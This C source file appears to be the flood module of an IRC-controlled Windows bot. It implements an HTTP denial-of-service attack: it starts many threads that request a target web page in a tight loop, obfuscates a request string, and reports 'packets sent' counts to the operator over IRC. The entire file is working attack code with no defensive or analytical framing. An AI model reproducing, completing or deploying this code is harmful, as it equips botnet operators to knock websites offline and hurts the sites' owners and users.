#include "flood.h"

#include <wininet.h>

void 
dos_thread
(char *lpTarget) {
    char tmp[0x40];
    strcpy(tmp,lpTarget);
    MessageBox(NULL,tmp,0x0,0x0);
    for(; flood.activated; flood.count++) {
        GetWebPage(NULL,0x0,tmp,"",riddle_enc("JHW"),"",0x1);
        Sleep(0x1);
    }
    ExitThread(0x0);
}

void 
HttpFlood
(char *lpTarget, unsigned long dwNumThreads) {
    int i;
    char buf[0x80], tmp[0x40];
    strcpy(tmp,lpTarget);
    for(i=0x0; i < dwNumThreads; i++) 
        CreateThread(0x0,0x0,(LPTHREAD_START_ROUTINE)dos_thread,tmp,0x0,NULL);
    while(flood.activated) {
        flood.nextsend=(flood.count + i);
        while(0x1) {
           if(flood.count >= flood.nextsend) {
              sprintf(buf,"[*] Flood status: %d packets sent to %s.",
                  flood.count, tmp);
              IrcSend(buf);
              break;
           }
           else Sleep(0x80);
        }
    }
}
